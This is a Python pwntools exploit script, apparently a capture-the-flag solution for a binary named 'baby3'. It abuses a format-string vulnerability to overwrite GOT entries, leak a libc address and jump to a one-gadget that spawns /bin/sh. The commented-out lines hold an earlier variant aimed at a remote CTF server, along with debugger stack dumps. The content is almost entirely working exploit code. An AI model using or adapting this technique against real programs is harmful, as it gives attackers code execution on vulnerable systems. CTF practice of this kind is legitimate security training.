from pwn import *
from fmtstr64 import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
#libc = ELF("libc.so.6")
stream = 0x0000000000400812
exit_got = 0x000000602048
printf_got = 0x000000602028
fgets_got = 0x000000602038
main = 0x000000000040076f
alarm_got = 0x000000602030
off = 6
cmd = '''
b* 0x0000000000400841
'''

r = process("./baby3")
p = fmtstr64_payload(6,{exit_got:main})
#gdb.attach(r)
r.sendlineafter("input: ",p)

# leaking libc_start_main
p = "leak: %45$p"
r.sendlineafter("input: ",p)
r.recvuntil("leak: ")
leak = int(r.recv(14),16)
libc_start_main = leak - 231
log.info("leak <__libc_start_main+231> : " + hex(leak)) 
log.info("leak <__libc_start_main> : " + hex(libc_start_main)) 

libc_base = libc_start_main - libc.symbols['__libc_start_main']
one_shot = libc_base + 0x4f322
p = fmtstr64_payload(off,{printf_got:one_shot})
r.sendlineafter("input: ",p)
r.interactive()

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

#def un64(data):
#    return int(data[::-1].encode("hex"),16)
##for i in range(20):
#r = process("./baby3")
##r = remote("baby-01.pwn.beer",10003)
#p = fmtstr64_payload(off , {exit_got:stream})
##gdb.attach(r,cmd)
#r.sendline(p)
#r.sendline("leak : %25$p %27$p    %33$p    %30$p")
#r.recvuntil("leak : ")
#data = r.recv(1000).split()
#log.info("raw data ----->>>" + str(data))
#log.info("leaked __libc_start_main : " + data[0])
#raw_libc_start_main = int(data[0],16)
#libc_start_main = raw_libc_start_main - 235
#
#log.success("libc_start_main ada disini : " + hex(libc_start_main))
#
#libc_base = libc_start_main - libc.symbols['__libc_start_main']
#libc_system = libc_base + libc.symbols['system']
#libc_binsh = libc_base + libc.search("/bin/sh").next()
##print "----------------"
##log.info("offset : " + str(i))
##print "----------------"
#one_gagdet = libc_base + 0xe57be
#log.info("libc system di : " + hex(libc_system))
#q = fmtstr64_payload(8,{printf_got:libc_system})
#r.sendline(q)
#
#r.interactive()
#r.close()

#r.sendline("/bin/ls -lasx")
#print "------------------------------------------------------------------"

# %27$p    %33$p    %30$p

#x8bAAAAAAH `$%20$p
#(nil)
#$ %19$p
#(nil)
#$ %25$p
#0x7ffee85c4db0
#$ %33$p
#0x40076f
#$ %30$p
#0x7fe17ff1909b  <---- libc_start_main
#$  
#
#x/25ixa $rsp
#0x7ffee85c4c18:	0x40084b	0x40084b
#0x7ffee85c4c28:	0x40084b	0x40084b
#0x7ffee85c4c38:	0x40084b	0x24000a7024303325
#0x7ffee85c4c48:	0x63363432256e6868	0x256e686824323125
#0x7ffee85c4c58:	0x6824333125633635	0x4141414141416e68
#0x7ffee85c4c68:	0x602048	0x602049
#0x7ffee85c4c78:	0x60204a	0xa
#0x7ffee85c4c88:	0x0	0x0
#0x7ffee85c4c98:	0x0	0x0
#0x7ffee85c4ca8:	0x0	0x0
#0x7ffee85c4cb8:	0x0	0x7ffee85c4db0
#0x7ffee85c4cc8:	0x252ece0619d66100	0x400850 <__libc_csu_init>
#0x7ffee85c4cd8:	0x7fe17ff1909b <__libc_start_main+235>
#
#r.sendline("%30$p")
# 16 - 15
#  x/25gx $rsp
#  x/25ixa $rsp
#r.sendline("%16$p")
#d = r.recv(8)
#print "leaked : " + d

	